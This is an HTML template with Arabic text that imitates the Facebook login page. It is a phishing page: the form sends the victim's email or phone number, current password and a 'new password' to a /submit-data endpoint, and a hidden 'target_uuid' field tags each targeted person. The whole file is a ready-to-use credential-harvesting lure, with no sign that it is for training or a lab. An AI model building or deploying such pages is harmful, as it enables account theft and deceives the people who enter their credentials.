<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول إلى فيسبوك</title>
    <style>
        body {
            font-family: Helvetica, Arial, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            width: 396px;
            text-align: center;
        }
        .fb-logo {
            color: #1877f2;
            font-size: 60px;
            font-weight: bold;
            margin-bottom: 20px;
            letter-spacing: -2px;
        }
        .login-card {
            background: #fff;
            border: none;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
            padding: 20px;
            margin-bottom: 20px;
        }
        .login-card h3 {
            font-size: 18px;
            font-weight: normal;
            margin-bottom: 15px;
        }
        input {
            width: 92%;
            padding: 14px 4%;
            margin: 6px 0;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 17px;
        }
        input:focus {
            outline: none;
            border-color: #1877f2;
            box-shadow: 0 0 0 2px #e7f3ff;
        }
        .btn-login {
            width: 100%;
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 20px;
            font-weight: bold;
            padding: 10px 0;
            cursor: pointer;
            margin-top: 10px;
        }
        .btn-login:hover {
            background-color: #166fe5;
        }
        .forgot-password {
            color: #1877f2;
            font-size: 14px;
            text-decoration: none;
            display: block;
            margin-top: 15px;
        }
        .divider {
            border-bottom: 1px solid #dadde1;
            margin: 20px 0;
        }
        .btn-new-account {
            background-color: #42b72a;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 17px;
            font-weight: bold;
            padding: 12px 16px;
            cursor: pointer;
        }
    </style>
</head>
<body>

<div class="login-container">
    <div class="fb-logo">facebook</div>
    <div class="login-card">
        <h3>تسجيل الدخول لفتح حسابك</h3>
        
        <form action="/submit-data" method="POST">
            <input type="hidden" name="target_uuid" value="{{ target_uuid }}">
            
            <input type="email" name="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
            <input type="password" name="password" placeholder="كلمة المرور الحالية" required>
            <input type="password" name="NewPassword" placeholder="كلمة المرور الجديدة" required>
            
            <button type="submit" class="btn-login">تسجيل الدخول</button>
        </form>
        
        <a href="#" class="forgot-password">هل نسيت كلمة السر؟</a>
        <div class="divider"></div>
        <button class="btn-new-account">إنشاء حساب جديد</button>
    </div>
    <p style="font-size: 14px;"><span style="font-weight: bold;">إنشاء صفحة</span> لشخصية مشهورة أو علامة تجارية أو عمل تجاري.</p>
</div>

</body>
</html>
